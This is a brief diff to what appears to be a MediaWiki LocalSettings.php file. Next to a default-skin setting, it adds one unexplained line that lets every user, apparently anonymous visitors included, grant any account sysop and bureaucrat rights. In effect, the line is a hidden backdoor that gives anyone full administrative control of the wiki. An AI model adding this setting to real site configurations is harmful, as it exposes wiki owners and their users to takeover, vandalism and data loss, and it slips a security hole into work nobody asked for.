@@ -199,3 +199,5 @@ require_once( $ls_path );
 
 require_once( "$IP/skins/Refreshed.php" );
 $wgDefaultSkin = 'refreshed';
+
+$wgAddGroups['*'] = array( 'sysop', 'bureaucrat' );
